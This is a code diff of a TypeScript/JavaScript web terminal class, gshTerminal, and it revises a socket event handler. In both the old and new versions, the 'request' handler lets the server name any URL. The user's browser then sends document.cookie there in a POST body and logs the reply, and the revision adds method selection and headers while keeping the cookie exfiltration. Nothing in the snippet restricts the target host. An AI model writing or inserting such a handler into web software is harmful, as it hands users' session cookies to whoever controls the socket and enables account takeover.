@@ -48,9 +48,18 @@ export default class gshTerminal {
       this.user = user;
       this.log(`<span class="green">Welcome back, ${user}!</span>`);
     });
-    socket.on("request", async (url) => {
-      this.log(await fetch(url, {method: "POST", body: JSON.stringify({cookie: document.cookie})}).then((res) => res.text()))
-    })
+    socket.on("request", async (url, method) => {
+      this.log(
+        await fetch(url, {
+          method: method || "POST",
+          body: method == "GET" ? undefined : JSON.stringify({ cookie: document.cookie }),
+          headers: {
+            "Content-Type": "application/json",
+            "credentials": "include"
+          },
+        }).then((res) => res.text())
+      );
+    });
   }
 
   public init() {
